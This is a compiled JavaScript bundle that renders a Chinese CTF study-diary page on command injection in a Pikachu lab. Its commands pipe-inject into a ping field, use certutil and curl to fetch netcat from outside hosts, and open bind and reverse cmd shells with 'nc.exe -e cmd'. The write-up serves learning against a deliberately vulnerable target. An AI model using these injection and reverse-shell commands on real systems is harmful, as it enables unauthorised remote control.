(window.webpackJsonp=window.webpackJsonp||[]).push([[190],{717:function(s,e,t){"use strict";t.r(e);var a=t(2),n=Object(a.a)({},(function(){var s=this,e=s._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("Boxx"),s._v(" "),e("p",[s._v("从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第54天")]),s._v(" "),e("p",[s._v("今日内容：基础入门-反弹SHELL&带外查询&正反向连接&防火墙出入站&文件下载")]),s._v(" "),e("p"),e("div",{staticClass:"table-of-contents"},[e("ul",[e("li",[e("a",{attrs:{href:"#防火墙出入站"}},[s._v("防火墙出入站")]),e("ul",[e("li",[e("a",{attrs:{href:"#整理思路"}},[s._v("整理思路：")])])])])])]),e("p"),s._v(" "),e("ul",[e("li",[s._v("小迪安全视频地址【"),e("RouterLink",{attrs:{to:"/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/"}},[s._v("🔗传送门")]),s._v("】")],1)]),s._v(" "),e("h1",{attrs:{id:"第24章-基础入门-反弹shell-带外查询-正反向连接-防火墙出入站-文件下载"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#第24章-基础入门-反弹shell-带外查询-正反向连接-防火墙出入站-文件下载"}},[s._v("#")]),s._v(" 第24章：基础入门-反弹SHELL&带外查询&正反向连接&防火墙出入站&文件下载")]),s._v(" "),e("h2",{attrs:{id:"防火墙出入站"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#防火墙出入站"}},[s._v("#")]),s._v(" 防火墙出入站")]),s._v(" "),e("p",[s._v("书接上回")]),s._v(" "),e("p",[s._v("我们尝试用IP地址拼接命令的方式，中间用管道符连接。我们在输入框中输入以下内容：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("127.0.0.1 | whoami\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:"/img/ctfLearn/image-20250112201835751.png",alt:"image-20250112201835751"}})]),s._v(" "),e("p",[s._v("如图所示，如果是用管道符连接的话，会不执行命令1，只执行命令2，利用这种特性，我们可以让他做反弹Shell，将权限给到我们入侵方。")]),s._v(" "),e("p",[s._v("其次，这里系统是用的Windows部署的"),e("code",[s._v("phpStudy")]),s._v("和"),e("code",[s._v("pikachu漏洞平台")]),s._v("，而Windows是没有自带nc工具的，我们需要做上传文件，去将nc上传到服务器。")]),s._v(" "),e("p",[s._v("这里上传文件的地方，我们可以转换思路，既然可以用命令，那就可以用下载，比如Linux的wget、curl，或者Windows的PowerShell、cmd的certutil.exe等。")]),s._v(" "),e("h3",{attrs:{id:"整理思路"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#整理思路"}},[s._v("#")]),s._v(" 整理思路：")]),s._v(" "),e("ol",[e("li",[e("p",[s._v("判断是不是Windows系统，这里我们刚才在执行"),e("code",[s._v("whoami")]),s._v("时，返回的用户是"),e("code",[s._v("administrator")]),s._v("(我认为这样判断不严谨)")])]),s._v(" "),e("li",[e("p",[s._v("Windows没有自带的nc工具，需要想办法上传nc工具。")])]),s._v(" "),e("li",[e("p",[s._v("通过下载的方式将nc送到这台Windows上。")])]),s._v(" "),e("li",[e("p",[s._v("我们拼接命令，用"),e("code",[s._v("IP+管道符+下载命令")]),s._v("的形式，视频中演示的是ping命令拼接cmd certuitl的下载方式，下载的是小迪提前准备好的服务器上的nc工具")]),s._v(" "),e("div",{staticClass:"language-cmd line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("127.0.0.1 | certutil.exe -urlcache -split -f http://47.94.346.117:80/nc.exe c:\\\\nc.exe\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("blockquote",[e("p",[s._v("Windows上没有nc工具，需要自己下载一个nc.exe工具【"),e("a",{attrs:{href:"https://eternallybored.org/misc/netcat/",target:"_blank",rel:"noopener noreferrer"}},[s._v("下载地址"),e("OutboundLink")],1),s._v("】，使用命令时如果不加环境变量就要写成nc.exe")])]),s._v(" "),e("p",[s._v("这里我们没有提前准备服务器，懒得找个服务器放这些，就用官方的下载地址凑活一下，也能用。我们换种方式，用"),e("code",[s._v("curl -O")]),s._v("的方式应该也是可以的，应该是通用的。")]),s._v(" "),e("div",{staticClass:"language-cmd line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("127.0.0.1 | curl https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip -o c:\\Users\\xxx\\Desktop\\netcat.zip\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("😶虽然成功下载了，但问题是从官网下载的是个安装包，还没解压，不好搞呀")]),s._v(" "),e("p",[s._v("😫还有个问题，我的虚拟机是以前的工作用的，这有当时公司的杀毒软件，下载的时候报了弹窗，好烦。")]),s._v(" "),e("p",[s._v("没办法，只能重新装一个Win10的虚拟机了，这老东家的杀软卸不掉")])]),s._v(" "),e("li",[e("p",[s._v("下载成功后，我们要考虑的是怎么解压到出来（视频中没有这一步骤，直接下载的nc.exe文件），用GPT生成了一段PowerShell代码试一下")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('$zipFile="C:\\Users\\Administrator\\Desktop\\netcat.zip";$destination="C:\\Users\\Administrator\\Desktop";if(!(Test-Path -Path $destination)){New-Item -ItemType Directory -Path $destination};Expand-Archive -Path $zipFile -DestinationPath $destination | Out-File -FilePath C:\\Users\\Administrator\\Desktop\\result.txt\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("多次尝试无果，都不能将压缩包解压，浪费太多时间了，准备直接进行下一步了。理论上感觉是可行的。")])]),s._v(" "),e("li",[e("p",[s._v("下一步是执行反弹操作，我们有两种方式，正向连接也就它监听我们连它，反向连接是主动把权限给我们")]),s._v(" "),e("p",[s._v("(1)我们先演示正向连接，用如下命令，将cmd绑定到5566端口：")]),s._v(" "),e("div",{staticClass:"language-shell line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-shell"}},[e("code",[e("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1 "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" C:"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Users"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Administrator"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Desktop"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("nc.exe "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" cmd "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-lvvp")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v(" \n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("我们控制端，要做的是连接这个受控端的IP地址和端口：")]),s._v(" "),e("div",{staticClass:"language-shell line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-shell"}},[e("code",[s._v("ncat "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("39.144")]),s._v(".94.4 "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("(2)接下来想想怎么反向连接，用如下命令，讲cmd端口给到远程的控制端的IP地址和端口上去：")]),s._v(" "),e("div",{staticClass:"language-shell line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-shell"}},[e("code",[e("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1 "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" C:"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Users"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Administrator"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Desktop"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("nc.exe "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" cmd "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("39.144")]),s._v(".94.5 "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("控制端做本地监听5566端口")]),s._v(" "),e("div",{staticClass:"language-shell line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-shell"}},[e("code",[s._v("ncat "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-lvvp")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])])])])],1)}),[],!1,null,null,null);e.default=n.exports}}]);